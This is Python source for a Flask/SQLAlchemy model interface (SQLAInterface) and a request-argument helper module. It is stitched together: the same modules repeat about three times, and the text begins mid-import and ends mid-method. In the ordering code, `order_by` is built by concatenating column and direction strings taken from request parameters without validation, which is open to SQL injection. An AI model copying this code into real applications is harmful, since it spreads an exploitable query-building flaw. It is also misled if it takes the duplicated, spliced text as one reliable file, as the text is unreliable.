from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """
    SQLAModel
    Implements SQLA support methods for views
    """
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """
            Returns the models class name
            useful for auto title on views
        """
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)                    
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """
    ------------- 
     GET METHODS
    -------------
    """

    def get_columns_list(self):
        """
            Returns all model's columns on SQLA properties
        """
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """
            Returns all model's columns except pk or fk
        """
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


"""
    For Retro-Compatibility
"""
SQLModel = SQLAInterface

import re
from flask import request


class Stack(object):
    """
        Stack data structure will not insert
        equal sequential data
    """
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """
        Get page arguments for group by
    """
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))                    
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))

# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """
    SQLAModel
    Implements SQLA support methods for views
    """
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """
            Returns the models class name
            useful for auto title on views
        """
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)                    
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """
    ------------- 
     GET METHODS
    -------------
    """

    def get_columns_list(self):
        """
            Returns all model's columns on SQLA properties
        """
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """
            Returns all model's columns except pk or fk
        """
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


"""
    For Retro-Compatibility
"""
SQLModel = SQLAInterface

import re
from flask import request


class Stack(object):
    """
        Stack data structure will not insert
        equal sequential data
    """
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """
        Get page arguments for group by
    """
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))                    
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))

# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """
    SQLAModel
    Implements SQLA support methods for views
    """
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """
            Returns the models class name
            useful for auto title on views
        """
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
